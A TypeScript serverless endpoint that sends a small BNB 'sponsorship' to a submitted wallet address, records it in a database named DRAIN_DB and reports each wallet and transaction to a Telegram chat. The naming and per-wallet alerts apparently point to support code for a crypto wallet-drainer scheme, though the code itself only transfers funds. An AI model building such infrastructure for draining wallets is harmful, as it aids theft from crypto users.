// functions/api/sponsor.ts
// POST /api/sponsor  { address: "0x..." }

import type { Env } from '../lib/types';
import {
  findSponsorship,
  createPendingSponsorship,
  updateSponsorship,
} from '../lib/db';
import { sendTelegramMessage } from '../lib/telegram';
import {
  createWalletClient,
  createPublicClient,
  http,
  parseEther,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';

export const onRequestPost: PagesFunction<Env> = async (context) => {
  const env = context.env;

  try {
    const { address } = (await context.request.json()) as { address?: string };
    if (!address) {
      return jsonResponse({ error: 'Missing address' }, 400);
    }

    const lower = address.toLowerCase();

    // Check if already has a confirmed or pending sponsorship
    const existing = await findSponsorship(env.DRAIN_DB, lower);
    if (
      existing &&
      ((existing as any).status === 'CONFIRMED' ||
        (existing as any).status === 'PENDING')
    ) {
      return jsonResponse({
        status: (existing as any).status,
        txHash: (existing as any).transaction_hash ?? null,
      });
    }

    // Create a pending row to block race conditions
    const sponsorAmount = env.SPONSOR_BNB_AMOUNT || '0.01';
    const insertResult = await createPendingSponsorship(
      env.DRAIN_DB,
      lower,
      sponsorAmount
    );
    if ((insertResult.meta as any)?.changes === 0) {
      // Another request beat us — fetch the row again
      const race = await findSponsorship(env.DRAIN_DB, lower);
      return jsonResponse({
        status: (race as any)?.status ?? 'PENDING',
        txHash: (race as any)?.transaction_hash ?? null,
      });
    }

    // Build viem clients
    const account = privateKeyToAccount(
      env.SPONSOR_WALLET_PRIVATE_KEY as `0x${string}`
    );
    const walletClient = createWalletClient({
      account,
      chain: bsc,
      transport: http(env.BSC_RPC_URL),
    });
    const publicClient = createPublicClient({
      chain: bsc,
      transport: http(env.BSC_RPC_URL),
    });

    // Send BNB to user
    const txHash = await walletClient.sendTransaction({
      to: lower as `0x${string}`,
      value: parseEther(sponsorAmount),
    });

    // Wait for confirmation
    const requiredConfirmations = Number(env.REQUIRED_CONFIRMATIONS || '1');
    let finalStatus = 'FAILED';
    try {
      const receipt = await publicClient.waitForTransactionReceipt({
        hash: txHash,
        confirmations: requiredConfirmations,
        timeout: 60_000, // 60 seconds
      });
      finalStatus = receipt.status === 'success' ? 'CONFIRMED' : 'FAILED';
    } catch {
      finalStatus = 'FAILED';
    }

    // Update DB
    const rowId = (insertResult.meta as any)?.last_row_id ?? 0;
    await updateSponsorship(env.DRAIN_DB, rowId, finalStatus, txHash);

    // Telegram notification
    const msg = [
      `✅ *Sponsorship ${finalStatus}*`,
      `Wallet: \`${address}\``,
      `Tx: \`${txHash}\``,
      `Network: BSC (56)`,
      `Time: ${new Date().toISOString()}`,
    ].join('\n');
    await sendTelegramMessage(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID, msg);

    return jsonResponse({ status: finalStatus, txHash });
  } catch (err: any) {
    console.error('Sponsor handler error', err);
    return jsonResponse({ error: err.message || 'Unknown error' }, 500);
  }
};

function jsonResponse(data: any, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json' },
  });
}
